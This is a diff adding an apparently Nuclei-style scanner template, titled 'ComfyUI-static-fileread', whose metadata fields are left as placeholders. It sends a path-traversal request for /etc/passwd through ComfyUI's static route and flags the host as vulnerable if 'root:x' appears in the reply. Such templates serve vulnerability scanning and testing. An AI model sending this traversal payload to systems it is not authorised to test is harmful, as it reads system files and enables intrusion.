@@ -1,0 +1,19 @@
+id: ComfyUI-static-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/../../../../../etc/passwd"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
